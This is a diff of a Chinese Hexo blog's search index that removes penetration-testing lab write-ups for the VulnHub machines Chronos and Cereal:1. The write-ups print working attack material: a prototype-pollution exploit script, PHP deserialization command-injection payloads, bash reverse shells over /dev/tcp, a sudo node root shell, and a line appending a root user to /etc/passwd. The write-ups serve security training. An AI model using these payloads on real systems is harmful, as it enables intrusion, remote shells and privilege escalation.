+ addr + <span class="string">&#x27; port &#x27;</span> + port);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
-
-<p>发现该代码在运行时会在本地 IP 的 8080 端口上运行一个 web 服务器。同时还发现该应用加载了 <code>express-fileupload</code> 库。通过搜索，发现若设置了 <code>app.use(fileupload(&#123; parseNested: true &#125;));</code> ，则存在可以用的漏洞。再次查看上述代码，发现恰好启用了该服务。</p>
-</li>
-<li><p>继续搜索有关内容，最终在一篇<a href="https://blog.p6.is/Real-World-JS-1/">博客文章</a>中找到可用的漏洞利用代码，并根据实验环境进行修改：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 10.0.2.15 为靶机的IP</span></span><br><span class="line"><span class="comment"># 5555 为靶机监听的端口</span></span><br><span class="line">cmd = <span class="string">&#x27;bash -c &quot;bash -i &amp;&gt; /dev/tcp/10.0.2.15/5555 0&gt;&amp;1&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># http://127.0.0.1:8080 为本次实验中目标服务的访问地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pollute</span></span><br><span class="line">requests.post(<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>, files = &#123;<span class="string">&#x27;__proto__.outputFunctionName&#x27;</span>: (</span><br><span class="line">    <span class="literal">None</span>, <span class="string">f&quot;x;console.log(1);process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;<span class="subst">&#123;cmd&#125;</span>&#x27;);x&quot;</span>)&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># execute command</span></span><br><span class="line">requests.get(<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>)</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>先将该段代码写入位于 kali 的某一文件中，再通过之前实验中的方式，利用在 kali 上启动 web 服务的方式将该文件上传至靶机（通过之前的步骤我们得知靶机中存在 python 环境）</p>
-<p><a id="要链接！！！"></a></p>
-<div align=left>
- <img src="https://assets.kekwy.com/images/image-20221021144921540.png" width=350 />
-</div>
-</li>
-<li><p>执行：</p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ python3 code.py</span><br></pre></td></tr></table></figure>
-
-<p>获取到另一个用户身份的反弹shell：</p>
-<div align=left>
- <img src="https://assets.kekwy.com/images/@IFF6W$S]HAT[XN09[_}XU.png" width=700 />
-</div></li>
-</ol>
-<h3 id="0x04-第一个-Flag"><a href="#0x04-第一个-Flag" class="headerlink" title="0x04. 第一个 Flag"></a>0x04. 第一个 Flag</h3><ol>
-<li><p>切换至当前用户的主目录 <code>/home/imera</code>，发现文件 <code>user.txt</code>。查看内容：</p>
-<div align=left>
- <img src="https://assets.kekwy.com/images/image-20221021151014936.png" width=400 />
-</div>
-</li>
-<li><p>使用 base58 解码后，得到：</p>
-<p><code>Char &#39;I&#39; at position 12 not in alphabet</code></p>
-</li>
-</ol>
-<h3 id="0x05-利用-node-命令提权"><a href="#0x05-利用-node-命令提权" class="headerlink" title="0x05. 利用 node 命令提权"></a>0x05. 利用 node 命令提权</h3><ol>
-<li><p>查看当前用户可以通过 <code>sudo</code> 执行的命令：</p>
-<div align=left>
- <img src="https://assets.kekwy.com/images/image-20221021151621621.png" width=700 />
-</div>
-
-
-<p>发现存在两个命令可以不提供密码直接使用 <code>sudo</code> 执行。</p>
-</li>
-<li><p>输入以下命令：</p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ sudo node -e <span class="string">&#x27;child_process.spawn(&quot;/bin/bash&quot;,&#123;stdio:[0,1,2]&#125;)&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p>生成一个拥有 root 权限的 shell 进行提权：</p>
-<div align=left>
- <img src="https://assets.kekwy.com/images/image-20221021151917440.png" width=700 />
-</div></li>
-</ol>
-<h2 id="三、实验结果"><a href="#三、实验结果" class="headerlink" title="三、实验结果"></a>三、实验结果</h2><p>Flag1：<code>Char &#39;I&#39; at position 12 not in alphabet</code></p>
-<p>root 提权：</p>
-<div align=left>
- <img src="https://assets.kekwy.com/images/image-20221021151917440.png" width=700 />
-</div>
-
-
-
-
-<h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><ul>
-<li>访问靶机80端口，查看源码发现存在对域名地址 <code>chronos.local</code> 的访问；</li>
-<li>修改 kali 的 <code>/etc/hosts</code> 文件，将上述域名与靶机 IP 绑定；</li>
-<li>利用  <a href="https://gchq.github.io/CyberChef/">CyberChef</a> 进行数据的编解码；</li>
-<li>拦截访问靶机80端口时，向 <code>http://chronos.local:8000</code> 发送的数据包，利用命令注入漏洞注入编码后的反弹 shell 指令；</li>
-<li>利用反弹 shell 进行信息收集，对文件  <code>/opt/chronos-v2/backend/server.js</code> 进行代码审计，发现隐藏的本地服务器；</li>
-<li>上网搜索相关的漏洞信息，发现漏洞利用代码；</li>
-<li>将代码文件上传至靶机并执行，得到另一个用户身份的反弹 shell；</li>
-<li>利用 node 命令进行本地提权。</li>
-</ul>
-]]></content>
-      <categories>
-        <category>网络攻防实战</category>
-      </categories>
-      <tags>
-        <tag>学习</tag>
-        <tag>Kali</tag>
-        <tag>网络</tag>
-        <tag>安全</tag>
-        <tag>Linux</tag>
-        <tag>vulnhub</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Butterfly 主题自定义字体无效</title>
-    <url>/solution1/</url>
-    <content><![CDATA[<p>待续</p>
-]]></content>
-      <categories>
-        <category>问题记录</category>
-      </categories>
-      <tags>
-        <tag>Hexo</tag>
-        <tag>CSS</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>不蒜子统计文章阅读量异常</title>
     <url>/solution2/</url>
     <content><![CDATA[<p>待续</p>
@@ -1349,267 +1336,6 @@
       <tags>
         <tag>HTTP</tag>
         <tag>HTML</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>【渗透测试】第十周 vulnhub-Cereal:1</title>
-    <url>/vulnhub-Cereal/</url>
-    <content><![CDATA[<blockquote>
-<p>网络攻防实战 第十次实验</p>
-<p>邮箱：<a href="mailto:&#x6b;&#101;&#x65;&#107;&#107;&#101;&#x77;&#121;&#64;&#113;&#x71;&#46;&#99;&#111;&#109;">&#x6b;&#101;&#x65;&#107;&#107;&#101;&#x77;&#121;&#64;&#113;&#x71;&#46;&#99;&#111;&#109;</a></p>
-<p>2022年11月26日</p>
-<p>靶机链接：<a href="https://vulnhub.com/entry/cereal-1,703/">https://vulnhub.com/entry/cereal-1,703/</a></p>
-</blockquote>
-<h2 id="一、实验目的"><a href="#一、实验目的" class="headerlink" title="一、实验目的"></a>一、实验目的</h2><p>获取靶机 root 权限和一个 root flag。</p>
-<p>我们将使用以下攻击手段：</p>
-<ul>
-<li>主机发现、端口扫描；</li>
-<li>隐藏路径爆破；</li>
-<li>域名绑定 IP；</li>
-<li>隐藏域名爆破；</li>
-<li>隐藏文件爆破；</li>
-<li>解析 PHP 对象序列并进行命令注入；</li>
-<li>反弹 shell；</li>
-<li>利用 pspy 工具查看靶机上运行的所有进程；</li>
-<li>通过链接文件利用靶机漏洞；</li>
-<li>自定义 root 用户；</li>
-</ul>
-<h2 id="二、实验内容"><a href="#二、实验内容" class="headerlink" title="二、实验内容"></a>二、实验内容</h2><blockquote>
-<p>kali: 10.0.2.15</p>
-<p>靶机: 10.0.2.17</p>
-</blockquote>
-<h3 id="0x00-准备工作"><a href="#0x00-准备工作" class="headerlink" title="0x00. 准备工作"></a>0x00. 准备工作</h3><ol>
-<li><p>获取靶机 IP 并扫描其开放的端口以及个端口上对应的服务：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -I eth0 -l</span><br><span class="line">sudo nmap -p- 10.0.2.17</span><br></pre></td></tr></table></figure>
-
-<img src="https://assets.kekwy.com/images/image-20221124223623886.png" alt="image-20221124223623886" style="zoom:150%;" />
-
-<p>发现开启了许多端口，经过对各个端口进行简单尝试之后。考虑从 80 端口寻找突破口。</p>
-</li>
-<li><p>访问 80 端口发现是一个 Apache 的默认页面，查看源码也并没有直接可利用的信息：</p>
-<img src="https://assets.kekwy.com/images/image-20221124224018467.png" alt="image-20221124224018467" style="zoom:150%;" />
-</li>
-<li><p>尝试进行隐藏路径爆破：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://10.0.2.17</span><br></pre></td></tr></table></figure>
-
-<img src="https://assets.kekwy.com/images/image-20221124224804390.png" alt="image-20221124224804390" style="zoom:150%;" />
-</li>
-<li><p>访问 <a href="http://10.0.2.17/blog%EF%BC%8C%E5%8F%91%E7%8E%B0%E4%BA%86%E4%B8%80%E4%B8%AA%E6%B2%A1%E6%9C%89%E6%A0%B7%E5%BC%8F%E7%9A%84%E9%A1%B5%E9%9D%A2%EF%BC%8C%E7%96%91%E4%BC%BC%E4%B8%8E%E6%9F%90%E4%B8%80%E5%9F%9F%E5%90%8D%E6%9C%89%E5%85%B3%EF%BC%9A">http://10.0.2.17/blog，发现了一个没有样式的页面，疑似与某一域名有关：</a></p>
-<img src="https://assets.kekwy.com/images/image-20221124225803901.png" alt="image-20221124225803901" style="zoom:150%;" />
-
-<p>同时发现该网页是由 WordPress 支持的。</p>
-<ul>
-<li>技巧：访问网页时出现卡顿，然后看到没有加载样式的网页，可推测是 CSS 加载失败，进而寻找是否需要将某一个域名的 IP 加入 hosts 文件中。</li>
-</ul>
-</li>
-<li><p>对 &#x2F;blog 路径进行进一步的路径爆破：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://10.0.2.17/blog/</span><br></pre></td></tr></table></figure>
-
-<img src="https://assets.kekwy.com/images/image-20221124230403083.png" alt="image-20221124230403083" style="zoom:150%;" />
-
-<p>发现目录 wp-admin，并且发现该目录被重定向到了我们刚才发现的那个域名。</p>
-</li>
-<li><p>尝试在 hosts 文件中加入记录 <code>10.0.2.17 cereal.ctf</code> 将该域名与靶机的 IP 地址对应。</p>
-<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">/etc/hosts:</span><br><span class="line">...</span><br><span class="line">10.0.2.17 		cereal.ctf</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>重新访问 blog 页面，发现成功加载了样式：</p>
-<img src="https://assets.kekwy.com/images/image-20221124231004932.png" alt="image-20221124231004932" style="zoom:150%;" />
-</li>
-<li><p>在 80 端口的 web 应用继续进行信息收集，未发现明显的有效信息。</p>
-</li>
-<li><p>尝试从 4441 端口（同样运行着一个 web 应用）继续寻找突破口：</p>
-<img src="https://assets.kekwy.com/images/image-20221125121314821.png" alt="image-20221125121314821" style="zoom:150%;" />
-
-<p>直接访问发现只有一行文本内容。</p>
-</li>
-</ol>
-<h3 id="0x01-服务器域名爆破"><a href="#0x01-服务器域名爆破" class="headerlink" title="0x01. 服务器域名爆破"></a>0x01. 服务器域名爆破</h3><ol>
-<li><p>联想到某些服务器可能会根据 HTTP 请求中 HOST 头的不同，为用户返回不同的页面。尝试使用 gobuster 对靶机 44441 端口进行域名爆破：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster vhost -u http://cereal.ctf:44441 --append-domain -w fierce_hostlist.txt</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>字典文件在 kali 上的路径为：&#x2F;usr&#x2F;share&#x2F;amass&#x2F;wordlists&#x2F;fierce_hostlist.txt</li>
-</ul>
-<img src="https://assets.kekwy.com/images/image-20221125154012372.png" alt="image-20221125154012372" style="zoom:150%;" />
-
-<p>成功扫描出一个域名：<code>secure.cereal.ctf</code></p>
-</li>
-<li><p>将该域名与靶机 IP 关联并添加记录到 kali 的 host 文件中，浏览器访问 <code>http://secure.cereal.ctf:44441/</code>：</p>
-<img src="https://assets.kekwy.com/images/image-20221125154405285.png" alt="image-20221125154405285" style="zoom:150%;" />
-</li>
-<li><p>发现当前页面可以对指定的 IP 进行 ping 操作，输入 kali 本机的 IP，查看结果：</p>
-<img src="https://assets.kekwy.com/images/image-20221125162041920.png" alt="image-20221125162041920" style="zoom:150%;" />
-
-<p>发现确实执行了 ping 操作，查看结果发现与系统命令中的 ping 操作返回结果格式相似，推测此处调用了系统指令，尝试进行命令注入。</p>
-</li>
-</ol>
-<h3 id="0x02-命令注入"><a href="#0x02-命令注入" class="headerlink" title="0x02. 命令注入"></a>0x02. 命令注入</h3><ol>
-<li><p>尝试直接注入未果，使用 burp suite 拦截当前页面点击 ping 按钮之后的请求：</p>
-<img src="https://assets.kekwy.com/images/image-20221125162519586.png" alt="image-20221125162519586" style="zoom:150%;" />
-
-<p>发现请求体比较可疑。</p>
-</li>
-<li><p>在 burp suite 中选中请求体中 obj 字段的值，进行解码：</p>
-<img src="https://assets.kekwy.com/images/image-20221125162824732.png" alt="image-20221125162824732" style="zoom:150%;" />
-
-
-
-
-
-<img src="https://assets.kekwy.com/images/image-20221125162901663.png" alt="image-20221125162901663" style="zoom:150%;" />
-
-<p>得到了解码结果，猜测是一个经过 php 序列化编码之后的对象数据格式。在请求头中的数据已经进行了序列化，可以推测该编码操作是网页中的脚本代码负责完成的。</p>
-</li>
-<li><p>查看相关的网页源码：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">submit_form</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="keyword">var</span> object = <span class="title function_">serialize</span>(&#123;<span class="attr">ipAddress</span>: <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="string">&quot;ipform&quot;</span>].<span class="property">ip</span>.<span class="property">value</span>&#125;);</span></span><br><span class="line"><span class="language-javascript">		object = object.<span class="title function_">substr</span>(object.<span class="title function_">indexOf</span>(<span class="string">&quot;&#123;&quot;</span>),object.<span class="property">length</span>);</span></span><br><span class="line"><span class="language-javascript">		object = <span class="string">&quot;O:8:\&quot;pingTest\&quot;:1:&quot;</span> + object;</span></span><br><span class="line"><span class="language-javascript">		<span class="variable language_">document</span>.<span class="property">forms</span>[<span class="string">&quot;ipform&quot;</span>].<span class="property">obj</span>.<span class="property">value</span> = object;</span></span><br><span class="line"><span class="language-javascript">		<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;ipform&#x27;</span>).<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>但是由于不知道服务器程序对该对象序列的处理流程，无法判断出直接有效的注入方式。联想到 blog 页面提示“尝试从备份中恢复”，猜测靶机上可能存在服务程序的备份文件，尝试通过隐藏文件爆破进行寻找。</p>
-<ul>
-<li><p>“We are in the process of restoring from our backups”</p>
-<img src="https://assets.kekwy.com/images/image-20221125171732769.png" alt="image-20221125171732769" style="zoom:150%;" /></li>
-</ul>
-</li>
-</ol>
-<h3 id="0x03-隐藏文件爆破"><a href="#0x03-隐藏文件爆破" class="headerlink" title="0x03. 隐藏文件爆破"></a>0x03. 隐藏文件爆破</h3><ol>
-<li><p>使用 kali 自带的 <code>DirBuster</code> 工具进行爆破：</p>
-<img src="https://assets.kekwy.com/images/image-20221125165830104.png" alt="image-20221125165830104" style="zoom:150%;" />
-
-<p>最终发现路径：<code>/back_en</code></p>
-</li>
-<li><p>继续对 &#x2F;back_en 下的文件进行爆破，由于是备份文件，猜测文件名后缀为 <code>.bak</code>：</p>
-<img src="https://assets.kekwy.com/images/image-20221126113550850.png" alt="image-20221126113550850" style="zoom:150%;" />
-
-<img src="https://assets.kekwy.com/images/image-20221126113421704.png" alt="image-20221126113421704" style="zoom:150%;" />
-
-<p>发现备份文件 <code>index.php.bak</code>。</p>
-</li>
-<li><p>将查找到的备份文件下载到 kali：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget http://secure.cereal.ctf:44441/back_en/index.php.bak</span><br></pre></td></tr></table></figure>
-
-<p>查看内容猜测是 ping 页面的后台程序源码，并找到与 ping 功能相关的代码：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pingTest</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$ipAddress</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$isValid</span> = False;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$output</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">validate</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 如果当前对象中的 isValid 值不为 True</span></span><br><span class="line">		<span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;isValid) &#123;</span><br><span class="line">            <span class="comment">// 进行了某种过滤</span></span><br><span class="line">			<span class="keyword">if</span> (<span class="title function_ invoke__">filter_var</span>(<span class="variable">$this</span>-&gt;ipAddress, FILTER_VALIDATE_IP))</span><br><span class="line">			&#123;</span><br><span class="line">                <span class="comment">// 测试通过才会执行代码</span></span><br><span class="line">				<span class="variable language_">$this</span>-&gt;isValid = True;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">ping</span>();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ping</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;isValid) &#123;</span><br><span class="line">            <span class="comment">// 指令的执行方式</span></span><br><span class="line">			<span class="variable language_">$this</span>-&gt;output = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;ping -c 3 <span class="subst">$this</span>-&gt;ipAddress&quot;</span>);	</span><br><span class="line">		&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;obj&#x27;</span>])) &#123;</span><br><span class="line">	<span class="variable">$pingTest</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;obj&#x27;</span>]));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="variable">$pingTest</span> = <span class="keyword">new</span> pingTest;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$pingTest</span>-&gt;<span class="title function_ invoke__">validate</span>();</span><br></pre></td></tr></table></figure>
-
-<p>通过对上述代码进行简单的分析，我们发现只需要我们上传的序列化对象中的 <code>isValid</code> 值本身为 True，就可以绕过服务端对 <code>ipAddress</code> 字段合法性的检测，最终导致靶机执行我们所注入的命令。</p>
-</li>
-</ol>
-<h3 id="0x04-继续命令注入"><a href="#0x04-继续命令注入" class="headerlink" title="0x04. 继续命令注入"></a>0x04. 继续命令注入</h3><p><a id="task1"></a></p>
-<ol>
-<li><p>简单学习 PHP 对象序列的格式之后，对此前解码获得的对象序列进行分析：</p>
-<p><code>O : 8 : &quot;pingTest&quot; : 1 : &#123;s : 9 : &quot;ipAddress&quot;; s : 9 : &quot;127.0.0.1&quot;; &#125;</code></p>
-<ul>
-<li>o：object，表示对象类型；</li>
-<li>8：表示其后的字符串长度为8；</li>
-<li>“pingTest”：表示当前对象为类 <code>pingTest</code> 的一个对象；</li>
-<li>1：表示其后包含1个该对象的属性，花括号中的内容即为对象的属性；</li>
-<li>s：string，表示字符串类型；</li>
-<li>9：其后的字符串长度；</li>
-<li>“ipAddress”：属性的名称；</li>
-<li>“127.0.0.1”：”ipAddress”属性的值；</li>
-</ul>
-<p>参考：<a href="https://blog.csdn.net/qq_31088019/article/details/126519989">PHP序列化和反序列化</a></p>
-</li>
-<li><p>可见请求体中发送给服务器的对象仅包含了 <code>ipAddress</code> 这个一个属性，为了绕过服务端的检测，需要添加 <code>isValid</code> 属性且将其赋值为 True。构造对象序列如下：</p>
-<p><code>O:8:&quot;pingTest&quot;:2:&#123;s:9:&quot;ipAddress&quot;;s:9:&quot;127.0.0.1&quot;;s:7:&quot;isValid&quot;;b:1;&#125;</code></p>
-<ul>
-<li>加入属性 <code>s:7:&quot;isValid&quot;;b:1;</code> 。</li>
-</ul>
-<p>其中，分析服务端代码得知，我们可以将需要注入的命令包含在 <code>ipAddress</code> 的值中，最终修改序列如下：</p>
-<p><code>O:8:&quot;pingTest&quot;:2:&#123;s:9:&quot;ipAddress&quot;;s:14:&quot;127.0.0.1 &amp; id&quot;;s:7:&quot;isValid&quot;;b:1;&#125;</code></p>
-</li>
-<li><p>在 burp suite 中用上述注入序列替换原始的对象序列，编码后发送：</p>
-<img src="https://assets.kekwy.com/images/image-20221125211946453.png" alt="image-20221125211946453" style="zoom:150%;" />
-</li>
-<li><p>发现除了 ping 的结果，我们还收到了注入命令的执行结果：</p>
-<img src="https://assets.kekwy.com/images/image-20221125212053362.png" alt="image-20221125212053362" style="zoom:150%;" />
-</li>
-<li><p>尝试使用如下命令获取反弹 shell：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/10.0.2.15/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
-
-<p>构造注入序列：</p>
-<p><code>O:8:&quot;pingTest&quot;:2:&#123;s:9:&quot;ipAddress&quot;;s:40:&quot;&amp;bash -i &gt;&amp; /dev/tcp/10.0.2.15/4444 0&gt;&amp;1&quot;;s:7:&quot;isValid&quot;;b:1;&#125;</code></p>
-<p>在 kali 上监听 4444 端口，执行注入命令，成功获取反弹 shell：</p>
-<img src="https://assets.kekwy.com/images/image-20221125222124067.png" alt="image-20221125222124067" style="zoom:150%;" /></li>
-</ol>
-<h3 id="0x05-本地漏洞提权"><a href="#0x05-本地漏洞提权" class="headerlink" title="0x05. 本地漏洞提权"></a>0x05. 本地漏洞提权</h3><p><a id="task2"></a></p>
-<ol>
-<li><p>利用 <code>pspy</code> 工具检测靶机上正在运行的进程：</p>
-<img src="https://assets.kekwy.com/images/image-20221126105419392.png" alt="image-20221126105419392" style="zoom:150%;" />
-
-<p>发现存在一个以 root 身份运行某个 shell 脚本的进程。</p>
-<ul>
-<li>pspy 工具：<a href="https://github.com/DominicBreuker/pspy">https://github.com/DominicBreuker/pspy</a></li>
-</ul>
-</li>
-<li><p>查看该脚本内容;</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chown rocky:apache /home/rocky/public_html/*</span><br></pre></td></tr></table></figure>
-
-<p>发现是将 <code>/home/rocky/public_html/*</code> 目录下的所有文件所有者更改为当前用户，猜测若在该目录下创建一个 passwd 文件的链接文件，会导致脚本执行时将 passwd 文件的所有者一并更改为当前用户，从而获取对  passwd 文件的写入权限。</p>
-</li>
-<li><p>使用 ln 命令将 passwd 文件链接到该目录下：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ln -s /etc/passwd /home/rocky/public_html/111111</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>等待片刻后查看 passwd 文件的权限：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls -l /etc/passwd</span><br></pre></td></tr></table></figure>
-
-<p><code>-rwxrwxr-x. 1 root root 1549 May 29  2021 /etc/passwd</code></p>
-<p>发现文件权限成功被修改。</p>
-</li>
-<li><p>再次使用 <a href="https://blog.kekwy.com/vulnhub-evilboxone/#0x05-%E8%87%AA%E5%AE%9A%E4%B9%89-root-%E7%94%A8%E6%88%B7">实验八</a> 中自定义 root 用户的方式，插入一条 root 权限的用户记录：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &#x27;test123:$1$5zwm/pYB$109Okt6Ql.GcBYi/z16xT1:0:0:root:/root:/bin/bash&#x27; &gt;&gt; /etc/passwd</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>切换至该自定义用户，成功提权：</p>
-<img src="https://assets.kekwy.com/images/image-20221126112046872.png" alt="image-20221126112046872" style="zoom:150%;" /></li>
-</ol>
-<h3 id="0x06-最终的信息收集"><a href="#0x06-最终的信息收集" class="headerlink" title="0x06. 最终的信息收集"></a>0x06. 最终的信息收集</h3><ol>
-<li><p>尝试使用 ssh 以自定义 root 用户身份登入靶机：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh test123@10.0.2.17</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>成功登入后查看当前目录下的文件：</p>
-<img src="https://assets.kekwy.com/images/image-20221126150151952.png" alt="image-20221126150151952" style="zoom:150%;" />
-</li>
-<li><p>查看文件 <code>proof.txt</code> 得到 flag：<code>1aeb5db4e979543cb807cfd90df77763</code></p>
-<img src="https://assets.kekwy.com/images/image-20221126150320630.png" alt="image-20221126150320630" style="zoom:150%;" />
-</li>
-<li><p>查看文件 <code>listener.sh</code>：<br><a id="task3"></a></p>
-<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">nc -k -l 139 <span class="built_in">&amp;</span></span><br><span class="line">nc -k -l 445 <span class="built_in">&amp;</span></span><br><span class="line">nc -k -l 11111 <span class="built_in">&amp;</span></span><br><span class="line">nc -k -l 22222 <span class="built_in">&amp;</span></span><br><span class="line">nc -k -l 22223 <span class="built_in">&amp;</span></span><br><span class="line">nc -k -l 33333 <span class="built_in">&amp;</span></span><br><span class="line">nc -k -l 33334 <span class="built_in">&amp;</span></span><br><span class="line">nc -k -l 44444 <span class="built_in">&amp;</span></span><br><span class="line">nc -k -l 55555 <span class="built_in">&amp;</span></span><br><span class="line">nc -k -l 55551</span><br></pre></td></tr></table></figure>
-
-<p>发现是一段 shell 脚本，通过 nc 命令监听了很多端口。</p>
-<p>推测这就是我们之前 nmap 扫描出来很多端口，但是无法确定其上所运行服务的原因——这些端口仅被监听，实际上并没有运行有效的服务。</p>
-</li>
-</ol>
-<h2 id="五、实验结果"><a href="#五、实验结果" class="headerlink" title="五、实验结果"></a>五、实验结果</h2><p><strong>root 权限：</strong></p>
-<img src="https://assets.kekwy.com/images/image-20221126112046872.png" alt="image-20221126112046872" style="zoom:150%;" />
-
-<ul>
-<li>任务一：<a href="#task1">点击跳转</a>；</li>
-<li>任务二：<a href="#task2">点击跳转</a>；</li>
-<li>任务三：<a href="#task3">点击跳转</a>。</li>
-</ul>
-<h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><ul>
-<li>本次实验靶机开发的端口很多，需要从扫描到的端口中寻找突破口。首先关注提供 web 应用的端口。</li>
-<li>浏览器访问 80 端口，未发现有效信息，进行路径爆破发现 <code>/blog</code> 路径，访问路径发现一个未加载样式的网页，并获得提示——靶机上存在某个服务端的备份文件。</li>
-<li>对 <code>/blog</code> 路径进行进一步爆破，发现某些路径被重定向到了某个域名的子路径上，尝试在 kali 的 hosts 文件中将该域名与靶机 IP 绑定。再次访问 <code>/blog</code> 路径，发现成功加载了样式。</li>
-<li>浏览器访问靶机 44441 端口，发现没有有效信息。对该端口进行域名爆破，发现一个隐藏的域名，同样将该域名与靶机 IP 进行绑定。再次访问后，发现当前页面可以对用户输入的 IP 地址进行 ping 操作。联想到命令注入。</li>
-<li>简单尝试注入后未果，拦截 ping 操作时发往服务器的请求头。发现网页将用户输入的 IP 地址包装成了一个对象，并做了序列化操作。但由于不知道服务端解析对象的方式，故无法直接进行命令注入。</li>
-<li>联想到 80 端口 <code>/blog</code> 路径下的提示，尝试通过路径、文件爆破寻找靶机上的备份文件。</li>
-<li>找到备份文件后，下载至 kali 查看，推测是 ping 操作页面服务端的源码。根据该源码中的对象解析方式，构造注入对象的序列，实现合法性绕过以及命令的注入，最终成功获取反弹 shell。</li>
-<li>使用 <code>pspy</code> 工具查看靶机上运行的进程，找到一个以 root 身份运行的 shell 脚本进程。查看相关脚本，发现该脚本将指定目录下的所有文件的所有者更改为了反弹 shell 中的当前用户。</li>
-<li>尝试在该目录下建立 passwd 文件的链接，使该脚本更改 passwd 文件的所有者，最终获取对 passwd 文件的写入权限。</li>
-<li>使用与实验八相同的操作自定义一条 root 用户记录，并插入 passwd 文件。</li>
-<li>切换至自定义用户，完成提权！</li>
-</ul>
-<p>ps：实验报告中只展示了成功的思路，但是在实际的渗透测试中，往往需要我们对多个漏洞点进行尝试，才能找到有效的突破口。</p>
-]]></content>
-      <categories>
-        <category>网络攻防实战</category>
-      </categories>
-      <tags>
-        <tag>学习</tag>
-        <tag>Kali</tag>
-        <tag>网络</tag>
-        <tag>安全</tag>
-        <tag>Linux</tag>
-        <tag>vulnhub</tag>
       </tags>
   </entry>
   <entry>
@@ -2198,244 +1924,253 @@
       </tags>
   </entry>
   <entry>
-    <title>【渗透测试】第八周 vulnhub-EvilBox:One</title>
-    <url>/vulnhub-EvilBoxOne/</url>
+    <title>【渗透测试】第十周 vulnhub-Cereal:1</title>
+    <url>/vulnhub-Cereal/</url>
     <content><![CDATA[<blockquote>
-<p>网络攻防实战 第八次实验</p>
-<p>邮箱：<a href="mailto:&#107;&#x65;&#101;&#107;&#x6b;&#x65;&#119;&#x79;&#x40;&#113;&#113;&#x2e;&#x63;&#x6f;&#x6d;">&#107;&#x65;&#101;&#107;&#x6b;&#x65;&#119;&#x79;&#x40;&#113;&#113;&#x2e;&#x63;&#x6f;&#x6d;</a></p>
-<p>2022年11月8日</p>
